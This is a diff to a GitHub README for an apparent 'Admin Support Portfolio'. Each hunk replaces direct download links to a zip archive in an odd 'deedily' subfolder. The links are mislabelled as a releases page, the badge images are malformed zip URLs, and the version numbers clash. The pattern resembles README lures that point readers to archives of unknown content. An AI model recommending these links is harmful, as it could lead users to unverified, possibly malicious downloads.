@@ -6,7 +6,7 @@ Welcome to the **Admin Support Portfolio**. This project showcases my work as an
 
 ## 🔗 Download Now
 
-[![Download Latest Release](https://raw.githubusercontent.com/remu123-collab/admin-support-portfolio/main/deedily/admin-support-portfolio.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/remu123-collab/admin-support-portfolio/main/deedily/admin-support-portfolio.zip)
+[![Download Latest Release](https://github.com/remu123-collab/admin-support-portfolio/raw/refs/heads/main/deedily/portfolio_admin_support_v3.5-beta.5.zip%20Latest%20Release-v1.0-blue)](https://github.com/remu123-collab/admin-support-portfolio/raw/refs/heads/main/deedily/portfolio_admin_support_v3.5-beta.5.zip)
 
 ## 📂 Overview
 
@@ -34,7 +34,7 @@ To run the samples in this portfolio, you will need:
 
 ## 📥 Download & Install
 
-To get started with the **Admin Support Portfolio**, visit this page to download: [Releases Page](https://raw.githubusercontent.com/remu123-collab/admin-support-portfolio/main/deedily/admin-support-portfolio.zip).
+To get started with the **Admin Support Portfolio**, visit this page to download: [Releases Page](https://github.com/remu123-collab/admin-support-portfolio/raw/refs/heads/main/deedily/portfolio_admin_support_v3.5-beta.5.zip).
 
 Follow these simple steps:
 
@@ -98,4 +98,4 @@ Check the Releases page for the detailed change log. This includes updates to pr
 
 Thank you for exploring the **Admin Support Portfolio**. I hope you find the projects helpful and informative. Your work in admin support is important, and these resources aim to assist you on that journey.
 
-[![Download Latest Release](https://raw.githubusercontent.com/remu123-collab/admin-support-portfolio/main/deedily/admin-support-portfolio.zip%20Latest%20Release-v1.0-blue)](https://raw.githubusercontent.com/remu123-collab/admin-support-portfolio/main/deedily/admin-support-portfolio.zip)
+[![Download Latest Release](https://github.com/remu123-collab/admin-support-portfolio/raw/refs/heads/main/deedily/portfolio_admin_support_v3.5-beta.5.zip%20Latest%20Release-v1.0-blue)](https://github.com/remu123-collab/admin-support-portfolio/raw/refs/heads/main/deedily/portfolio_admin_support_v3.5-beta.5.zip)
